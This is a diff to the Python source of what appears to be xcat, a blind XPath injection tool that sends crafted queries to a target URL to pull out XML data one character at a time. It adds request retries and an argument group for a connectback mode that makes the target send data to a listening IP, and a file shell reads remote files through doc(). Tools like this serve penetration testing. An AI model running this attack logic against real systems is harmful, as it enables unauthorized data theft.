@@ -141,7 +141,7 @@ class PayloadMaker(object):
 def countStuff(payload, node, bigstuff=False, getContentLength=True, start=0, end=0):
     if not bigstuff:
         for i in xrange(start, end or args.search_limit):
-            if executeQuery(args.URL, payload(count=i, node=node), args.true_keyword or args.false_keyword):
+            if executeQuery(args.URL, payload(count=i, node=node)):
                 return i
         return False
     
@@ -153,15 +153,12 @@ def countStuff(payload, node, bigstuff=False, getContentLength=True, start=0, en
             p = payloads.get_count_length
             af = payloads.count_children
 
-        if executeQuery(args.URL, af(node=node, count=0), args.true_keyword or args.false_keyword):
+        if executeQuery(args.URL, af(node=node, count=0)):
             return 0
         MIN = 0
         MAX = 10
-        for i in xrange(args.step_size):
-
-
-
-            if executeQuery(args.URL, p(node=node, min=MIN, max=MAX), args.true_keyword or args.false_keyword):
+        for i in xrange(args.step_size+1):
+            if executeQuery(args.URL, p(node=node, min=MIN, max=MAX)):
                 return countStuff(af, node, bigstuff=False, start=MIN, end=MAX)
             MIN+=10
             MAX+=10
@@ -243,8 +240,7 @@ def _getCharactersHttp(node, payload, name):
     executeQuery(args.URL, payloads.BASE.substitute(payload=payloads.http_transfer.substitute(URL=args.connectback_ip,
                                                                                                 query=query_id,
                                                                                                 PORT=p,
-                                                                                                node=node)),
-                   args.true_keyword or args.false_keyword)
+                                                                                                node=node)))
     
     try:
         return q.get(timeout=7)
@@ -260,12 +256,13 @@ def getCharacters(node, payload, size=None, name=False):
     else:
         q = payloads.BASE.substitute(payload=payloads.node_exists.substitute(node=node))
 
-    if not executeQuery(args.URL, q, args.true_keyword or args.false_keyword):
+    if not executeQuery(args.URL, q):
         return ""
 
-    searchspace = string.ascii_letters+string.digits+string.punctuation
+    searchspace = string.ascii_letters+string.digits#+string.punctuation
     if size and size > 10:
         if args.use_regex and args.xversion == "2":
+            raw_input("using regex")
             searchspace = ""
             spaces = (("[a-z]",string.lowercase),)
             
@@ -283,8 +280,7 @@ def getCharacters(node, payload, size=None, name=False):
                 n_pat = new_node
                 if args.lowercase:
                     n_pat = "lower-case(%s)"%new_node
-                if executeQuery(args.URL, payloads.BASE.substitute(payload=payloads.wrap_regex.substitute(node=n_pat, pattern=pattern)), 
-                                args.true_keyword or args.false_keyword):
+                if executeQuery(args.URL, payloads.BASE.substitute(payload=payloads.wrap_regex.substitute(node=n_pat, pattern=pattern))):
                     searchspace+=space
 
     if args.connectback:
@@ -306,18 +302,25 @@ def getCharacter(node, payload, count, searchspace):
     for i in searchspace:
         if executeQuery(args.URL, payload(character=i, 
                                      node=node, count=count
-                                     ), args.true_keyword or args.false_keyword):
+                                     )):
             return i
     return False
 
+def executeQuery(url, payload):
+    for i in xrange(4):
+        try:
+            return executeQueryInner(url, payload)
+        except urllib2.URLError, e:
+            if i == 3: # last try
+                raise e
 
-def executeQuery(url, payload, match_word):
+def executeQueryInner(url, payload):
     payload = payload.replace("'", args.quote_character)
 
     if args.http_method == "GET":
-        data = urllib2.urlopen(args.URL+args.post_argument+urllib.quote_plus(payload)).read()
+        data = urllib2.urlopen(url+args.post_argument+urllib.quote_plus(payload)).read()
     else:
-        data = urllib2.urlopen(args.URL, data=args.post_argument+urllib.quote_plus(payload)).read()
+        data = urllib2.urlopen(url, data=args.post_argument+urllib.quote_plus(payload)).read()
     if args.error_keyword:
         # Look for an exception
         return args.error_keyword in data
@@ -355,10 +358,15 @@ if __name__ == "__main__":
                         default=False, dest="lowercase", action="store_true")
     parser.add_argument("--regex", help="Use Regex to reduce the search space of text. Xpath 2.0 only",
                         default=False, dest="use_regex", action="store_true")
-    parser.add_argument("--connectback", help="Use a clever technique to deliver the XML document data over HTTP to xcat. Requires a public IP address and port listening permissions",
+    group2 = parser.add_mutually_exclusive_group()
+    #group2.add_argument("--dns", help="Experimental: Use DNS requests to transfer data. XPath 2.0 only. This parameter is the end of the hostname. Only works with alphanumeric characters, 64character limit (in total).",
+    #                             action="store", dest="dns_location")
+    group2.add_argument("--connectback", help="Use a clever technique to deliver the XML document data over HTTP to xcat. Requires a public IP address and port listening permissions",
                         action="store_true", dest="connectback")
+
     parser.add_argument("--connectbackip", help="IP Address to listen on for connectback", action="store", dest="connectback_ip")
     parser.add_argument("--connectbackport", help="The port to listen on for connectback data", action="store", dest="connectback_port", default=80, type=int)
+
     parser.add_argument("--notfoundstring", help="The character to place when a character cannot be found in the searchspace", action="store", dest="notfoundchar", default="?")
     parser.add_argument("--fileshell", help="Launch a shell for browing remote files", action="store_true", dest="fileshell")
     parser.add_argument("URL", action="store")
@@ -387,7 +395,7 @@ if __name__ == "__main__":
         
     if args.xversion == "auto":
         # Autodetect if we are running xpath 2.0
-        if executeQuery(args.URL, payloads.detect_version, args.true_keyword or args.false_keyword):
+        if executeQuery(args.URL, payloads.detect_version):
             args.xversion = "2"
         else:
             args.xversion = "1" 
@@ -399,7 +407,7 @@ if __name__ == "__main__":
 
     
     if args.use_regex and args.xversion == "2":
-        if not executeQuery(args.URL, payloads.regex_support, args.true_keyword or args.false_keyword):
+        if not executeQuery(args.URL, payloads.regex_support):
             sys.stderr.write("No regex support found, disabling\n")
             args.use_regex = False
     
@@ -414,7 +422,7 @@ if __name__ == "__main__":
             sys.exit(1)
         while True:
             file = raw_input("Enter a file URI: ")
-            if not executeQuery(args.URL, payloads.BASE.substitute(payload=payloads.doc_available.substitute(URI=file)), args.true_keyword or args.false_keyword):
+            if not executeQuery(args.URL, payloads.BASE.substitute(payload=payloads.doc_available.substitute(URI=file))):
                 print "File %s is not available (doc-available returned false)"%file
                 continue
             GetXMLFromNode("doc('%s')/*"%file)
